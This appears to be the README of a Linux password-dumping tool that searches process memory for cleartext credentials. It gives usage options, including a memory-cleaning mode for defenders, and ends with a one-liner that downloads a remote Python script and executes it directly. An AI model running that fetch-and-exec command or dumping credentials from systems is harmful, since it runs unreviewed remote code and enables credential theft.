# Dump_Passwords_Linux
Usage

usage: dump.py [-h] [--clean] [-v] [-p PID] [--search-password]

optional arguments:
    -h, --help         show this help message and exit
    --clean            @blueteams protect yourself and clean found passwords from memory ! You might want to regularly run this on your workstation/servers
    -v, --verbose      be more verbose !
    -p PID, --pid PID  choose the process's pid to scan instead of automatic selection
    --search-password  prompt for your password and search it in all your processes !.


Or just: 

python -c 'import urllib;exec urllib.urlopen("https://raw.githubusercontent.com/Kapalov/Dump_Passwords_Linux/master/dump.py").read()'


Enjoy!)
